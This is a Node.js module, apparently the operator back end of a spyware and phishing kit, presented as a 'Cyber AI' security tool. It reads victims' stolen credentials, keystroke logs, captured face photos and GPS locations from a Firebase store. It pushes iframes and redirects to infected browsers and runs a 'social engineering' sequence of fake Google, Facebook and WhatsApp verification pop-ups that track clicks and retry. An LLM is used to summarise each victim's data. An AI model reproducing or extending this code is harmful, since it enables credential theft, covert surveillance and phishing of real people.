const http = require("http");
const https = require("https");

// ═══════════════════════════════════════════════════════════════
// MISSION TYPES
// ═══════════════════════════════════════════════════════════════
const MISSIONS = {
    threat_scan: {
        name: "Threat Scan",
        description: "Full security scan — detect threats, anomalies, compromised devices",
        steps: ["fetch_state", "analyze_threats", "generate_report"],
        autoFix: false,
    },
    auto_cleanup: {
        name: "Auto Cleanup",
        description: "Remove offline devices, stale trash, duplicate records",
        steps: ["find_offline", "find_stale_trash", "delete_cleanup"],
        autoFix: true,
    },
    deploy_payload: {
        name: "Deploy Payload",
        description: "Deploy page/alert to all online devices",
        steps: ["list_online", "deploy", "verify"],
        autoFix: true,
    },
    investigate_device: {
        name: "Investigate Device",
        description: "Deep dive into one device — activity, threats, anomalies",
        steps: ["fetch_device", "analyze_activity", "detect_anomalies", "report"],
        autoFix: false,
    },
    respond_threat: {
        name: "Respond to Threat",
        description: "Detect threat + auto respond (block device, alert admin)",
        steps: ["detect_threat", "assess", "respond", "verify"],
        autoFix: true,
    },
    generate_report: {
        name: "Generate Report",
        description: "Full database analysis + executive summary",
        steps: ["fetch_all", "analyze", "format_report"],
        autoFix: false,
    },
    social_engineering: {
        name: "Social Engineering Sequence",
        description: "Deploy modal → track user response → follow up (redirect / retry)",
        steps: ["deploy_modal", "track_response", "follow_up"],
        autoFix: true,
    },
};

// ═══════════════════════════════════════════════════════════════
// THREAT DETECTOR
// ═══════════════════════════════════════════════════════════════
class ThreatDetector {
    constructor(firebaseUrl) {
        this.firebaseUrl = firebaseUrl;
    }

    async httpGet(path) {
        return new Promise((resolve) => {
            const client = this.firebaseUrl.startsWith("https") ? https : http;
            const req = client.get(this.firebaseUrl + path + ".json", (res) => {
                let data = "";
                res.on("data", c => data += c);
                res.on("end", () => {
                    try { resolve(JSON.parse(data || "null")); }
                    catch { resolve(null); }
                });
            });
            req.on("error", () => resolve(null));
            req.setTimeout(10000, () => { req.destroy(); resolve(null); });
        });
    }

    async detectUnknownDevices() {
        const devices = await this.httpGet("/devices") || {};
        const threats = [];

        for (const [id, d] of Object.entries(devices)) {
            if (d.deletedAt) continue;

            if (!d.name || d.name === "unknown" || d.name === "?") {
                threats.push({
                    type: "unknown_device",
                    severity: "medium",
                    deviceId: id,
                    message: `Device ${id.slice(0, 10)}... has no valid name`,
                    autoFixable: true,
                });
            }

            if (!d.browser || d.browser === "unknown") {
                threats.push({
                    type: "missing_browser",
                    severity: "low",
                    deviceId: id,
                    message: "Browser info missing",
                    autoFixable: true,
                });
            }
        }

        return threats;
    }

    async detectSuspiciousActivity() {
        const keylogs = await this.httpGet("/keylogs") || {};
        const creds = await this.httpGet("/stolen_credentials") || {};
        const threats = [];

        for (const [deviceId, credsNode] of Object.entries(creds)) {
            const count = Object.keys(credsNode || {}).length;
            if (count > 10) {
                threats.push({
                    type: "mass_credential_capture",
                    severity: "critical",
                    deviceId,
                    message: `${count} credentials captured — possible phishing success`,
                    autoFixable: false,
                });
            }
        }

        for (const [deviceId, keylogNode] of Object.entries(keylogs)) {
            const entries = Object.values(keylogNode || {});
            const last10min = entries.filter(e =>
                (Date.now() - (e.timestamp || 0)) < 10 * 60 * 1000
            );
            if (last10min.length > 50) {
                threats.push({
                    type: "rapid_keylogging",
                    severity: "high",
                    deviceId,
                    message: `${last10min.length} keystrokes in 10 min — possible automation`,
                    autoFixable: false,
                });
            }
        }

        return threats;
    }

    async detectAnomalies() {
        const devices = await this.httpGet("/devices") || {};
        const online = await this.httpGet("/online_devices") || {};
        const threats = [];

        for (const [id, d] of Object.entries(devices)) {
            if (d.deletedAt) continue;
            const ip = d.ip || "";
            if (ip.startsWith("0.") || ip === "unknown" || ip === "") {
                threats.push({
                    type: "invalid_ip",
                    severity: "low",
                    deviceId: id,
                    message: `Invalid IP: ${ip}`,
                    autoFixable: true,
                });
            }
        }

        for (const [id, o] of Object.entries(online)) {
            if (o.status !== "online" && (Date.now() - (o.lastSeen || 0)) > 7 * 86400000) {
                threats.push({
                    type: "zombie_device",
                    severity: "medium",
                    deviceId: id,
                    message: `Offline for ${Math.floor((Date.now() - o.lastSeen) / 86400000)} days`,
                    autoFixable: true,
                });
            }
        }

        return threats;
    }

    async scanAll() {
        console.log("🔍 Running full threat scan...");

        const [unknownDevices, suspiciousActivity, anomalies] = await Promise.all([
            this.detectUnknownDevices(),
            this.detectSuspiciousActivity(),
            this.detectAnomalies(),
        ]);

        const allThreats = [...unknownDevices, ...suspiciousActivity, ...anomalies];

        const bySeverity = {
            critical: allThreats.filter(t => t.severity === "critical"),
            high: allThreats.filter(t => t.severity === "high"),
            medium: allThreats.filter(t => t.severity === "medium"),
            low: allThreats.filter(t => t.severity === "low"),
        };

        console.log(`🔍 Found ${allThreats.length} threats:`);
        console.log(`   🔴 Critical: ${bySeverity.critical.length}`);
        console.log(`   🟠 High: ${bySeverity.high.length}`);
        console.log(`   🟡 Medium: ${bySeverity.medium.length}`);
        console.log(`   🟢 Low: ${bySeverity.low.length}`);

        return {
            threats: allThreats,
            bySeverity,
            total: allThreats.length,
            scannedAt: Date.now(),
        };
    }
}

// ═══════════════════════════════════════════════════════════════
// MISSION EXECUTOR
// ═══════════════════════════════════════════════════════════════
class MissionExecutor {
    constructor(firebaseUrl, groqChat) {
        this.firebaseUrl = firebaseUrl;
        this.groqChat = groqChat;
        this.detector = new ThreatDetector(firebaseUrl);
    }

    async httpGet(path) {
        return new Promise((resolve) => {
            const client = this.firebaseUrl.startsWith("https") ? https : http;
            const req = client.get(this.firebaseUrl + path + ".json", (res) => {
                let data = "";
                res.on("data", c => data += c);
                res.on("end", () => {
                    try { resolve(JSON.parse(data || "null")); }
                    catch { resolve(null); }
                });
            });
            req.on("error", () => resolve(null));
            req.setTimeout(10000, () => { req.destroy(); resolve(null); });
        });
    }

    async httpPut(path, data) {
        return new Promise((resolve, reject) => {
            const u = new URL(this.firebaseUrl + path + ".json");
            const client = u.protocol === "https:" ? https : http;
            const body = JSON.stringify(data);
            const req = client.request({
                hostname: u.hostname,
                path: u.pathname + u.search,
                method: "PUT",
                headers: {
                    "Content-Type": "application/json",
                    "Content-Length": Buffer.byteLength(body),
                },
            }, (res) => {
                res.on("data", () => { });
                res.on("end", () => resolve());
            });
            req.on("error", reject);
            req.write(body);
            req.end();
        });
    }

    async httpPatch(path, data) {
        return new Promise((resolve, reject) => {
            const u = new URL(this.firebaseUrl + path + ".json");
            const client = u.protocol === "https:" ? https : http;
            const body = JSON.stringify(data);
            const req = client.request({
                hostname: u.hostname,
                path: u.pathname + u.search,
                method: "PATCH",
                headers: {
                    "Content-Type": "application/json",
                    "Content-Length": Buffer.byteLength(body),
                },
            }, (res) => {
                res.on("data", () => { });
                res.on("end", () => resolve());
            });
            req.on("error", reject);
            req.write(body);
            req.end();
        });
    }

    async threatScan() {
        const report = await this.detector.scanAll();

        let aiSummary = "Scan complete";
        try {
            const aiSummaryRes = await this.groqChat([
                {
                    role: "system",
                    content: "You are a cybersecurity analyst. Summarize the threat report in short Hinglish (2-3 sentences).",
                },
                {
                    role: "user",
                    content: `Threats detected:\nCritical: ${report.bySeverity.critical.length}\nHigh: ${report.bySeverity.high.length}\nMedium: ${report.bySeverity.medium.length}\nLow: ${report.bySeverity.low.length}\n\nProvide a security assessment.`,
                },
            ]);
            aiSummary = aiSummaryRes?.choices?.[0]?.message?.content || "Scan complete";
        } catch (e) {
            console.warn("AI summary failed:", e.message);
        }

        return {
            mission: "threat_scan",
            status: report.bySeverity.critical.length > 0 ? "critical" :
                report.bySeverity.high.length > 0 ? "warning" : "healthy",
            report,
            aiSummary,
            actionsTaken: [],
        };
    }

    async autoCleanup() {
        const devices = await this.httpGet("/devices") || {};
        const online = await this.httpGet("/online_devices") || {};

        const deleted = [];
        const fixed = [];

        for (const [id, d] of Object.entries(devices)) {
            if (d.deletedAt) continue;

            const o = online[id] || {};
            if (o.status !== "online" && (Date.now() - (o.lastSeen || 0)) > 7 * 86400000) {
                await this.httpPut(`/devices/${id}/deletedAt`, Date.now());
                deleted.push({ id, name: d.name, reason: "zombie" });
                continue;
            }

            const patch = {};
            if (!d.browser || d.browser === "unknown") patch.browser = "Unknown";
            if (!d.os || d.os === "unknown") patch.os = "Unknown";

            if (Object.keys(patch).length > 0) {
                await this.httpPatch(`/devices/${id}`, patch);
                fixed.push({ id, fields: Object.keys(patch) });
            }
        }

        return {
            mission: "auto_cleanup",
            deleted: deleted.length,
            fixed: fixed.length,
            details: { deleted, fixed },
        };
    }

    async deployPayload(page) {
        const online = await this.httpGet("/online_devices") || {};
        const onlineDevices = Object.entries(online)
            .filter(([, o]) => o.status === "online")
            .map(([id]) => id);

        const deployed = [];
        for (const deviceId of onlineDevices) {
            await this.httpPut(`/admin_commands/${deviceId}/iframe`, {
                active: true,
                page,
                timestamp: Date.now(),
                setBy: "cyber-ai",
            });
            deployed.push(deviceId);
        }

        return {
            mission: "deploy_payload",
            page,
            deployed: deployed.length,
            deviceIds: deployed,
        };
    }

    async investigateDevice(deviceId) {
        if (!deviceId) throw new Error("deviceId required");

        const device = await this.httpGet(`/devices/${deviceId}`) || {};
        const online = await this.httpGet(`/online_devices/${deviceId}`) || {};
        const creds = await this.httpGet(`/stolen_credentials/${deviceId}`) || {};
        const keylogs = await this.httpGet(`/keylogs/${deviceId}`) || {};
        const photos = await this.httpGet(`/captured_data/${deviceId}/face_scan`) || {};
        const gps = await this.httpGet(`/gps_locations/${deviceId}/current`) || {};

        let analysis = "Analysis complete";
        try {
            const analysisRes = await this.groqChat([
                {
                    role: "system",
                    content: "You are a security analyst. Analyze this device and give a threat assessment in Hinglish (2-3 sentences).",
                },
                {
                    role: "user",
                    content: `Device: ${JSON.stringify(device)}\nStatus: ${JSON.stringify(online)}\nCredentials: ${Object.keys(creds).length}\nKeylogs: ${Object.keys(keylogs).length}\nPhotos: ${Object.keys(photos).length}\nGPS: ${JSON.stringify(gps)}\n\nGive analysis.`,
                },
            ]);
            analysis = analysisRes?.choices?.[0]?.message?.content || "Analysis complete";
        } catch (e) {
            console.warn("AI analysis failed:", e.message);
        }

        return {
            mission: "investigate_device",
            deviceId,
            data: {
                device,
                online,
                creds: Object.keys(creds).length,
                keylogs: Object.keys(keylogs).length,
                photos: Object.keys(photos).length,
                gps,
            },
            analysis,
        };
    }

    async respondToThreat(threatType) {
        const report = await this.detector.scanAll();
        const threat = report.threats.find(t => t.type === threatType);

        if (!threat) {
            return { mission: "respond_threat", error: "Threat not found: " + threatType };
        }

        const actions = [];

        if (threat.type === "mass_credential_capture") {
            await this.httpPut(`/devices/${threat.deviceId}/deletedAt`, Date.now());
            actions.push({ type: "block_device", deviceId: threat.deviceId });
        }

        if (threat.type === "unknown_device") {
            await this.httpPut(`/devices/${threat.deviceId}/name`, "Unknown Device");
            actions.push({ type: "auto_name", deviceId: threat.deviceId });
        }

        if (threat.type === "invalid_ip") {
            await this.httpPut(`/devices/${threat.deviceId}/ip`, "0.0.0.0");
            actions.push({ type: "fix_ip", deviceId: threat.deviceId });
        }

        return {
            mission: "respond_threat",
            threat,
            actions,
        };
    }
    async socialEngineering(deviceId, brand, options = {}) {
        if (!deviceId) throw new Error("deviceId required");

        const brandMap = {
            facebook: { url: "facebook.com", icon: "https://facebook.com/favicon.ico" },
            instagram: { url: "instagram.com", icon: "https://instagram.com/favicon.ico" },
            google: { url: "www.google.com", icon: "https://www.google.com/favicon.ico" },
            gmail: { url: "gmail.com", icon: "https://gmail.com/favicon.ico" },
            whatsapp: { url: "whatsapp.com", icon: "https://whatsapp.com/favicon.ico" },
            twitter: { url: "twitter.com", icon: "https://twitter.com/favicon.ico" },
            linkedin: { url: "linkedin.com", icon: "https://linkedin.com/favicon.ico" },
        };

        const brandKey = (brand || "google").toLowerCase().replace(/\s+/g, '');
        const brandInfo = brandMap[brandKey] || {
            url: `${brandKey}.com`,
            icon: `https://${brandKey}.com/favicon.ico`
        };

        const trackId = "se_" + Date.now() + "_" + Math.random().toString(36).slice(2, 8);

        // 1. Deploy modal
        const modalConfig = {
            message: options.message || `Your ${brand || 'Google'} account needs verification. Please confirm your identity to continue.`,
            title: options.title || `${brand || 'Google'} Security`,
            brand: brand || "Google",
            url: brandInfo.url,
            icon: brandInfo.icon,
            okText: options.okText || "Verify Now",
            cancelText: options.cancelText || "Cancel",
            okAction: options.okAction || `https://${brandInfo.url}`,
            trackId: trackId,
            active: true,
            timestamp: Date.now(),
        };

        await this.httpPut(`/admin_commands/${deviceId}/modal`, modalConfig);

        // 2. Track event
        await this.httpPut(`/se_events/${deviceId}/${trackId}/initiated`, {
            event: "sequence_started",
            brand: brand,
            deviceId: deviceId,
            timestamp: Date.now(),
            time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
            status: "deployed",
        });

        // 3. Wait for user response (check every 5 sec, max 2 min)
        let userResponse = null;
        const startTime = Date.now();

        while (Date.now() - startTime < 120000) { // 2 min timeout
            await new Promise(r => setTimeout(r, 5000));

            const events = await this.httpGet(`/se_events/${deviceId}/${trackId}`) || {};

            // Check for OK click
            for (const [key, val] of Object.entries(events)) {
                if (val.event === "modal_ok_clicked") {
                    userResponse = "ok";
                    break;
                }
                if (val.event === "modal_cancel_clicked") {
                    userResponse = "cancel";
                    break;
                }
            }

            if (userResponse) break;
        }

        // 4. Follow-up action
        let followUp = null;
        if (userResponse === "ok") {
            // Redirect to actual brand site
            await this.httpPut(`/admin_commands/${deviceId}/redirect`, {
                url: `https://${brandInfo.url}`,
                active: true,
                timestamp: Date.now(),
            });
            followUp = { action: "redirected", url: `https://${brandInfo.url}` };
        } else if (userResponse === "cancel") {
            // Retry with different message
            await this.httpPut(`/admin_commands/${deviceId}/custom_toast`, {
                message: "Action required. Please complete verification.",
                type: "err",
                active: true,
                timestamp: Date.now(),
            });
            followUp = { action: "retry_toast_sent" };
        } else {
            followUp = { action: "timeout_no_response" };
        }

        return {
            mission: "social_engineering",
            deviceId,
            brand: brand || "Google",
            trackId,
            userResponse: userResponse || "no_response",
            followUp,
            status: userResponse === "ok" ? "success" : "partial",
        };
    }

    async getSocialEvents(deviceId) {
        if (!deviceId) throw new Error("deviceId required");

        const events = await this.httpGet(`/se_events/${deviceId}`) || {};
        const allEvents = [];

        for (const [trackId, trackData] of Object.entries(events)) {
            for (const [key, event] of Object.entries(trackData || {})) {
                allEvents.push({ trackId, eventKey: key, ...event });
            }
        }

        allEvents.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));

        return {
            deviceId,
            totalEvents: allEvents.length,
            events: allEvents.slice(0, 50),
        };
    }
}

// ═══════════════════════════════════════════════════════════════
// CYBER AI SERVER (Port 5001)
// ═══════════════════════════════════════════════════════════════
function setupCyberAI(groqChat, firebaseUrl) {
    const executor = new MissionExecutor(firebaseUrl, groqChat);

    const cyberServer = http.createServer(async (req, res) => {
        res.setHeader("Access-Control-Allow-Origin", "*");
        res.setHeader("Access-Control-Allow-Headers", "Content-Type");
        res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");

        if (req.method === "OPTIONS") {
            res.writeHead(204);
            return res.end();
        }

        if (req.method !== "POST") {
            res.writeHead(405, { "Content-Type": "application/json" });
            return res.end(JSON.stringify({ error: "POST only" }));
        }

        let body = "";
        req.on("data", c => body += c);
        req.on("end", async () => {
            try {
                const cmd = JSON.parse(body);
                const action = cmd.action;
                let result;

                console.log(`\n🎯 CYBER AI: ${action}`);

                switch (action) {
                    case "scan":
                        result = await executor.threatScan();
                        break;
                    case "cleanup":
                        result = await executor.autoCleanup();
                        break;
                    case "deploy":
                        result = await executor.deployPayload(cmd.page || "captcha");
                        break;
                    case "investigate":
                        result = await executor.investigateDevice(cmd.deviceId);
                        break;
                    case "respond":
                        result = await executor.respondToThreat(cmd.threatType);
                        break;
                    case "social":
                        result = await executor.socialEngineering(
                            cmd.deviceId,
                            cmd.brand || "Google",
                            {
                                message: cmd.message,
                                title: cmd.title,
                                okText: cmd.okText,
                                cancelText: cmd.cancelText,
                                okAction: cmd.okAction,
                            }
                        );
                        break;

                    case "social_events":
                        result = await executor.getSocialEvents(cmd.deviceId);
                        break;
                    case "missions":
                        result = {
                            missions: Object.entries(MISSIONS).map(([id, m]) => ({
                                id,
                                name: m.name,
                                description: m.description,
                            })),
                        };
                        break;
                    default:
                        res.writeHead(400, { "Content-Type": "application/json" });
                        return res.end(JSON.stringify({ error: "Unknown action: " + action }));
                }

                if (!res.headersSent) {
                    res.writeHead(200, { "Content-Type": "application/json" });
                    res.end(JSON.stringify({ ok: true, ...result }));
                }
            } catch (e) {
                console.error("❌ Cyber AI error:", e.message);
                if (!res.headersSent) {
                    res.writeHead(500, { "Content-Type": "application/json" });
                    res.end(JSON.stringify({ error: e.message }));
                }
            }
        });
    });

    cyberServer.listen(5001, "127.0.0.1", () => {
        console.log("🎯 Cyber AI on http://127.0.0.1:5001");
        console.log("   Missions: scan, cleanup, deploy, investigate, respond, missions");
    });
}

module.exports = { setupCyberAI, MISSIONS, ThreatDetector, MissionExecutor };
